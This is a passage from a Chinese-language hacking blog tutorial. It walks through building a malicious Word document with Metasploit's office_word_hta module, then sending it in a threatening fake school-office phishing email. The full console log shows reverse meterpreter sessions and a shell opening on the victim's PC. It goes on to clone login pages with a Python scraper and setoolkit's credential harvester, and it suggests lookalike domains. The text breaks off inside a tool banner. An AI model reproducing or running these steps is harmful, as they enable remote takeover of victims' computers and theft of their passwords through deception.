class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> SRVHOST <span class="number">192.168</span><span class="number">.31</span><span class="number">.103</span>  <span class="comment"># Kali的ip地址</span></span><br><span class="line"><span class="keyword">set</span> FILENAME    <span class="comment"># 自定义文件名</span></span><br><span class="line"><span class="comment"># 其他参数默认即可</span></span><br></pre></td></tr></table></figure></p><ul><li>执行渗透攻击模块<code>exploit</code></li></ul><p>在对参数进行设置之后，我们便能进一步执行<code>exploit</code>(或者<code>run</code>)开始渗透了<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/<span class="keyword">run</span><span class="bash"></span></span><br></pre></td></tr></table></figure></p><p>执行后的结果如下：<br><img src="http://pjq6e477y.bkt.clouddn.com/10.PNG" ,="" width="600"></p><p>通过上图，我们主要分析如下信息：</p><ol><li>所开启的端口：4444、8080</li><li>链接地址：<a href="http://192.168.31.103:8080/default.hta" target="_blank" rel="noopener">http://192.168.31.103:8080/default.hta</a></li><li>木马文件路径：/root/.msf4/local/教务处通知务必查收.doc</li></ol><p>至此，我们的木马文件就已经生成了，我们需要进一步的加以利用。<br><img src="https://ws2.sinaimg.cn/bmiddle/6af89bc8gw1f8r1dlii2aj203s04mt8i.jpg"></p><h3 id="社工"><a href="#社工" class="headerlink" title="社工"></a>社工</h3><p>OK，现在我们需要通过邮件来将该文件发送给攻击目标了，在对方下载并打开的一瞬间也就是他落入陷阱的时候，在这里我们使用的是QQ邮件，然后博主还不想坐牢，所以就拿自己的账号来演示了，<code>攻击账号：510087153@qq.com，目标账号：26647879@qq.com</code>。好的，下面我们来模拟一下邮件的发送过程，邮件的主题及内容就要考验我们的欺骗等级了。为了提高对方掉入陷阱的概率，我们通过<code>510087153@qq.com</code>账号编辑邮件的主题及正文内容编写如下（这个不是很会写，就随便写写吧，其实在实际攻击的过程中是需要收集目标大量数据的）：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">主题：教务处通知，务必查看</span><br><span class="line">正文：</span><br><span class="line">Zero同学：</span><br><span class="line">    你好，我是教务处的王老师，主要负责通知有无法正常毕业可能的学生。</span><br><span class="line">    从最近几学期你的在校表现来看，你有长期旷课、打架斗殴、成帮结派的行为，对此给学校带来许多负面影响。为此教务处将对你下达黄牌警告，为了</span><br><span class="line">保证你的正常毕业，还请仔细阅读附件内容。如若不然，则将会采取进一步的措施：向家长通报、升旗仪式上通报、公告栏通报。仔细阅读附件后，务必在</span><br><span class="line"><span class="number">1</span>小时内给予回复，否则后果自负。</span><br><span class="line">    </span><br><span class="line">教务处，王老师</span><br></pre></td></tr></table></figure></p><p>编辑好后，如下所示。<br><img src="http://pjq6e477y.bkt.clouddn.com/6.png" width="600"></p><p>OK，供给端的操作至此就已经完成了，确认无误并没有明显造假痕迹之后，我们发送邮件然后等待对方“咬钩”即可。</p><p>之后，我们回到目标机windows，发现目标账号此时已经收到了一封来自教务处的邮件，我们打开邮件既能见到如上邮件内容（此刻目标的心理活动请读者自行脑补，这里就不再描述了）。待目标阅读完成之后并将附件<code>教务处通知务必.doc</code>下载到本地，若目标打开文件之后则已经“咬钩”了。</p><p>OK，不管目标打开的文件是空也好，乱码也罢，只要他鼠标左键双击的一瞬间则已经达到了攻击者的目的了。这是，我们再次回到Kali Linux的终端，显示内容如下所示：<br><img src="http://pjq6e477y.bkt.clouddn.com/11.PNG" width="600"></p><p>通过上图，我们发现已经获得了目标的session会话，并显示了目标的ip，此时我们就能拿对方的服务器“为所欲为”了，比如摄像头监控、映射文件、桌面捕捉等等坐牢性操作。我们可通过如下命令获取对方的终端权限：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sessions -l </span><br><span class="line">sessions -i <span class="number">1</span></span><br><span class="line">shell</span><br><span class="line"><span class="keyword">exit</span></span><br><span class="line">background</span><br></pre></td></tr></table></figure></p><blockquote><p>补充：获取到目标终端之后也许会乱码，我们执行chcp 65001即可解决</p></blockquote><p>之后的Dos命令操作这里就不再细说了，有兴趣的朋友可以跳转之前写的一篇文章：<img></p><h3 id="完整命令"><a href="#完整命令" class="headerlink" title="完整命令"></a>完整命令</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@kali:</span>~# msfconsole </span><br><span class="line">[-] Failed to connect to the database: could <span class="keyword">not</span> connect to server: Connection refused</span><br><span class="line">Is the server running on host <span class="string">"localhost"</span> (::<span class="number">1</span>) <span class="keyword">and</span> accepting</span><br><span class="line">TCP/<span class="built_in">IP</span> connections on port <span class="number">5432</span>?</span><br><span class="line">could <span class="keyword">not</span> connect to server: Connection refused</span><br><span class="line">Is the server running on host <span class="string">"localhost"</span> (<span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>) <span class="keyword">and</span> accepting</span><br><span class="line">TCP/<span class="built_in">IP</span> connections on port <span class="number">5432</span>?</span><br><span class="line"></span><br><span class="line">                                                  </span><br><span class="line"><span class="keyword">Call</span> trans opt: received. <span class="number">2</span>-<span class="number">19</span>-<span class="number">98</span> <span class="number">13</span>:<span class="number">24</span>:<span class="number">18</span> REC:Loc</span><br><span class="line"></span><br><span class="line">     Trace program: running</span><br><span class="line"></span><br><span class="line">           wake <span class="meta">up</span>, Neo...</span><br><span class="line">        the matrix has you</span><br><span class="line">      follow the white rabbit.</span><br><span class="line"></span><br><span class="line">          knock, knock, Neo.</span><br><span class="line"></span><br><span class="line">                        (<span class="string">`.         ,-,</span></span><br><span class="line"><span class="string">                        `</span> <span class="string">`.    ,;' /</span></span><br><span class="line"><span class="string">                         `</span>.  ,<span class="string">'/ .'</span></span><br><span class="line">                          <span class="string">`. X /.'</span></span><br><span class="line"><span class="string">                .-;--''--.._`</span> <span class="string">` (</span></span><br><span class="line"><span class="string">              .'            /   `</span></span><br><span class="line">             ,           <span class="string">` '   Q '</span></span><br><span class="line"><span class="string">             ,         ,   `</span>._    \</span><br><span class="line">          ,.|         <span class="string">'     `-.;_'</span></span><br><span class="line">          :  . <span class="string">`  ;    `</span>  <span class="string">` --,.._;</span></span><br><span class="line"><span class="string">           ' `</span>    ,   )   .<span class="string">'</span></span><br><span class="line"><span class="string">              `._ ,  '</span>   /_</span><br><span class="line">                 <span class="comment">; ,''-,;' ``-</span></span><br><span class="line">                  <span class="string">``-..__`</span><span class="string">`--`</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">                             https:</span>//metasploit.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v4<span class="meta">.17</span><span class="meta">.25</span>-dev                         ]</span><br><span class="line">+ -- --=[ <span class="number">1828</span> exploits - <span class="number">1033</span> auxiliary - <span class="number">318</span> post       ]</span><br><span class="line">+ -- --=[ <span class="number">541</span> payloads - <span class="number">44</span> encoders - <span class="number">10</span> nops            ]</span><br><span class="line">+ -- --=[ Free Metasploit Pro trial: http://r-<span class="number">7.</span>co/trymsp ]</span><br><span class="line"></span><br><span class="line">msf &gt; use exploit/windows/fileformat/office_word_hta </span><br><span class="line">msf exploit(windows/fileformat/office_word_hta) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/fileformat/office_word_hta):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   FILENAME  msf.doc          yes       The file name.</span><br><span class="line">   SRVHOST   <span class="number">0.0</span><span class="meta">.0</span><span class="meta">.0</span>          yes       The local host to listen on. This must be an address on the local machine <span class="keyword">or</span> <span class="number">0.0</span><span class="meta">.0</span><span class="meta">.0</span></span><br><span class="line">   SRVPORT   <span class="number">8080</span>             yes       The local port to listen on.</span><br><span class="line">   SSL       false            no        Negotiate SSL for incoming connections</span><br><span class="line">   SSLCert                    no        Path to a custom SSL certificate (<span class="meta">default</span> is randomly generated)</span><br><span class="line">   URIPATH   <span class="meta">default</span>.hta      yes       The URI to use for the HTA file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   <span class="number">0</span>   Microsoft Office <span class="built_in">Word</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(windows/fileformat/office_word_hta) &gt; set SRVHOST <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span></span><br><span class="line">SRVHOST =&gt; <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span></span><br><span class="line">msf exploit(windows/fileformat/office_word_hta) &gt; set FIlENAME 教务处通知务必查收.doc</span><br><span class="line">FIlENAME =&gt; 教务处通知务必查收.doc</span><br><span class="line">msf exploit(windows/fileformat/office_word_hta) &gt; exploit</span><br><span class="line">[*] Exploit running as background job <span class="number">0</span>.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span>:<span class="number">4444</span> </span><br><span class="line">[+] 教务处通知务必查收.doc stored <span class="meta">at</span> /root/.msf4/local/.doc</span><br><span class="line">[*] Using URL: http://<span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span>:<span class="number">8080</span>/<span class="meta">default</span>.hta</span><br><span class="line">[*] Server started.</span><br><span class="line">msf exploit(windows/fileformat/office_word_hta) &gt; [*] Sending stage (<span class="number">179779</span> bytes) to <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span></span><br><span class="line">[*] Meterpreter session <span class="number">1</span> opened (<span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span>:<span class="number">52520</span>) <span class="meta">at</span> <span class="number">2018</span>-<span class="number">12</span>-<span class="number">14</span> <span class="number">18</span>:<span class="number">45</span>:<span class="number">45</span> +<span class="number">0800</span></span><br><span class="line">[*] Sending stage (<span class="number">179779</span> bytes) to <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span></span><br><span class="line">[*] Meterpreter session <span class="number">2</span> opened (<span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span>:<span class="number">52519</span>) <span class="meta">at</span> <span class="number">2018</span>-<span class="number">12</span>-<span class="number">14</span> <span class="number">18</span>:<span class="number">45</span>:<span class="number">48</span> +<span class="number">0800</span></span><br><span class="line">[*] Sending stage (<span class="number">179779</span> bytes) to <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span></span><br><span class="line">[*] Meterpreter session <span class="number">3</span> opened (<span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span>:<span class="number">52521</span>) <span class="meta">at</span> <span class="number">2018</span>-<span class="number">12</span>-<span class="number">14</span> <span class="number">18</span>:<span class="number">45</span>:<span class="number">48</span> +<span class="number">0800</span></span><br><span class="line"></span><br><span class="line">msf exploit(windows/fileformat/office_word_hta) &gt; sessions -l</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information          Connection</span><br><span class="line">  --  ----  ----                     -----------          ----------</span><br><span class="line">  <span class="number">1</span>         meterpreter x86/windows  TXJ-PC\TXJ @ TXJ-PC  <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span>:<span class="number">52520</span> (<span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span>)</span><br><span class="line">  <span class="number">2</span>         meterpreter x86/windows  TXJ-PC\TXJ @ TXJ-PC  <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span>:<span class="number">52519</span> (<span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span>)</span><br><span class="line">  <span class="number">3</span>         meterpreter x86/windows  TXJ-PC\TXJ @ TXJ-PC  <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span>:<span class="number">52521</span> (<span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span>)</span><br><span class="line"></span><br><span class="line">msf exploit(windows/fileformat/office_word_hta) &gt; sessions -i <span class="number">1</span></span><br><span class="line">[*] Starting interaction with <span class="number">1</span>...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process <span class="number">3980</span> created.</span><br><span class="line">Channel <span class="number">3</span> created.</span><br><span class="line">Microsoft Windows [?汾 <span class="number">6.1</span><span class="meta">.7601</span>]</span><br><span class="line">??????? (c) <span class="number">2009</span> Microsoft Corporation???????????????</span><br><span class="line"></span><br><span class="line"><span class="symbol">C:</span>\Users\TXJ\Desktop&gt;chcp <span class="number">65001</span></span><br><span class="line">chcp <span class="number">65001</span></span><br><span class="line">Active code page: <span class="number">65001</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">C:</span>\Users\TXJ\Desktop&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C is Windows</span><br><span class="line"> Volume Serial Number is 12B9-032A</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\TXJ\Desktop</span><br><span class="line"></span><br><span class="line"><span class="number">2018</span>/<span class="number">12</span>/<span class="number">14</span>  <span class="number">18</span>:<span class="number">32</span>    &lt;DIR&gt;          .</span><br><span class="line"><span class="number">2018</span>/<span class="number">12</span>/<span class="number">14</span>  <span class="number">18</span>:<span class="number">32</span>    &lt;DIR&gt;          ..</span><br><span class="line"><span class="number">2018</span>/<span class="number">12</span>/<span class="number">14</span>  <span class="number">18</span>:<span class="number">36</span>             <span class="number">2</span>,<span class="number">461</span> Google Chrome.lnk</span><br><span class="line"><span class="number">2018</span>/<span class="number">12</span>/<span class="number">14</span>  <span class="number">18</span>:<span class="number">42</span>    &lt;DIR&gt;          images</span><br><span class="line"><span class="number">2018</span>/<span class="number">12</span>/<span class="number">08</span>  <span class="number">04</span>:<span class="number">27</span>                <span class="number">95</span> 新建文本文档.txt</span><br><span class="line">               <span class="number">2</span> File(s)          <span class="number">2</span>,<span class="number">556</span> bytes</span><br><span class="line">               <span class="number">3</span> Dir(s)  <span class="number">30</span>,<span class="number">969</span>,<span class="number">548</span>,<span class="number">800</span> bytes free</span><br><span class="line"></span><br><span class="line"><span class="symbol">C:</span>\Users\TXJ\Desktop&gt;</span><br></pre></td></tr></table></figure><h2 id="钓鱼网站"><a href="#钓鱼网站" class="headerlink" title="钓鱼网站"></a>钓鱼网站</h2><p>除了上述社工邮件之外，在实际过程中钓鱼网站也是比较常见的。钓鱼网站主要是先通过爬虫手段先爬取常见的登录页面，比如像163邮箱之类的常见应用。下面附一个Python的小爬虫Demo来爬取163登录页并保存：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">import requests</span><br><span class="line">except:</span><br><span class="line">import os</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"The package is downloading......"</span>)</span><br><span class="line">os.system(<span class="string">"python -m pip install --upgrade pip &amp;&amp; pip install requests"</span>)</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"The requirement already satisfied"</span>)</span><br><span class="line"></span><br><span class="line">def get_page(url, headers):</span><br><span class="line">try:</span><br><span class="line"><span class="keyword">if</span> requests.<span class="builtin-name">get</span>(<span class="attribute">url</span>=url, <span class="attribute">headers</span>=headers).status_code == 200:</span><br><span class="line">request = requests.<span class="builtin-name">get</span>(<span class="attribute">url</span>=url, <span class="attribute">headers</span>=headers)</span><br><span class="line">request.encoding = <span class="string">"utf-8"</span></span><br><span class="line">return request.text</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"Error! Please resend the request"</span>)</span><br><span class="line">return get_page(<span class="attribute">url</span>=url, <span class="attribute">headers</span>=headers).text</span><br><span class="line">except RequestException as e:</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"&#123;&#125;&#123;&#125;Error! Please resend the request"</span>.format(e, <span class="string">"\n"</span>))</span><br><span class="line">return get_page(<span class="attribute">url</span>=url, <span class="attribute">headers</span>=headers).text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"</span></span><br><span class="line">&#125;</span><br><span class="line">html = get_page(url = <span class="string">"https://mail.163.com/"</span>, <span class="attribute">headers</span>=headers)</span><br><span class="line">with open(<span class="string">"163maillogin.html"</span>, <span class="string">"w"</span>, <span class="attribute">encoding</span>=<span class="string">"utf-8"</span>) as f:</span><br><span class="line">f.write(html)</span><br></pre></td></tr></table></figure></p><p><img src="http://pjq6e477y.bkt.clouddn.com/4.png" width="600"></p><p>爬取好后，我们就能将该页面发布到自己的服务器中然后等待受害者的登录，待其输入账号密码之后就会在我们的Kali Linux终端截取到账号及密码了，下面我们通过<code>setoolkit</code>工具来模拟实现该钓鱼网站的过程。</p><h3 id="setoolkit攻击"><a href="#setoolkit攻击" class="headerlink" title="setoolkit攻击"></a>setoolkit攻击</h3><p>在Kali终端执行<code>setoolkit</code>，执行之后我们会见到如下内容：<br><img src="http://pjq6e477y.bkt.clouddn.com/12.PNG" width="600"></p><p>之后，我们选择第一个选项<code>Social-Engineering Attacks</code>社会工程学，选择并回车之后，我们可见如下内容：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Select <span class="keyword">from</span> the menu:</span><br><span class="line"></span><br><span class="line"> 1) Spear-Phishing Attack Vectors　　　　　　＃ 鱼叉式钓鱼攻击向量</span><br><span class="line"> 2) Website Attack Vectors　　　　　　       ＃ 网页攻击向量</span><br><span class="line"> 3) Infectious Media Generator　　　　       ＃ 媒介感染生成器</span><br><span class="line"> 4) Create a Payload <span class="keyword">and</span> Listener　　       ＃ 生成一个payload并监听</span><br><span class="line"> 5) Mass Mailer Attack　　　　　　　　　     ＃ 大规模邮件钓鱼</span><br><span class="line"> 6) Arduino-Based Attack Vector　　　　     ＃ Arduino的攻击</span><br><span class="line"> 7)<span class="built_in"> Wireless </span>Access Point Attack Vector　　 ＃ 无线接入点攻击</span><br><span class="line"> 8) QRCode Generator Attack Vector　　　　　＃ 二维码攻击</span><br><span class="line"> 9) Powershell Attack Vectors　　　　　　    ＃ powershell攻击</span><br><span class="line">10) Third Party Modules　　　　　　　　　　  ＃ 第三方模块</span><br><span class="line">　　</span><br><span class="line">99) Return back <span class="keyword">to</span> the main menu.</span><br></pre></td></tr></table></figure></p><p>通过上述11个选项的解释，我们已经认识到了该社会工程学的强大了并对社会工程学<code>setoolkit</code>工具有了一个大概的了解了，此次我们用到的是第二个模块<code>Website Attack Vectors</code>，之后进一步进行第三个选项<code>Credential Harvester Attack Method</code>，随后选择第二个<code>Site Cloner</code>。执行之后，我们可见如下内容：<br><img src="http://pjq6e477y.bkt.clouddn.com/15.PNG" width="600"></p><p>之后我们输入目标网页从而将爬取网页的源代码并创建一个80端口的服务，比如此次我们拿知乎的登录首页来进行演示，为此我们输入<code>https://www.zhihu.com/signup?next=%2F</code>，如上述所编代码一样，该命令会将知乎的登录页面爬取下来然后将该页面发布到本机的80端口服务中，我们来访问该页面看看：<br><img src="http://pjq6e477y.bkt.clouddn.com/14.PNG" width="600"></p><p>OK，如你所见，此时的页面除了域名不一样之外，其他的内容完全是一模一样的，在实际“钓鱼”的过程中，攻击者往往会将域名尽量的相似化，比如<code>pq.com、pp.com、zhlhu.com、zhini.com</code>。这就好比考试，命题人总会出一些及其容易错的题目，也许你一个不小心就会失算从而正中命题者的陷阱，比如Zero前几天遇到的几道题：<br><img src="http://pjq6e477y.bkt.clouddn.com/5.png" width="600"></p><p>命题人往往会根据自己的自身经验尝试着去抓住大部分考生的弱点，从而得到一个选拔的效果，待你发现自身的错误之后恐怕为时已晚，分已经丢了，我们此刻能做的也只有扇扇自己几个耳光来小惩罚以下自己。</p><p>跑题了，回来吧。</p><p>社会工程学也是一样的，目标一不留神就会“咬钩”。如上所述，我们访问之后会发现一模一样的页面，此时我们尝试着输入账号密码试试，会发现用户端并没有什么明显的反应，我们再来回到Kali Linux看看，果然，你的账号、密码已经成功被截取到了。账号、密码被攻击者拿到之后，后面所发生的事我想不必介绍大家也都了解了。</p><h3 id="完整命令-1"><a href="#完整命令-1" class="headerlink" title="完整命令"></a>完整命令</h3><figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XX                                                                          XX</span><br><span class="line">XX   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   XX</span><br><span class="line">XX   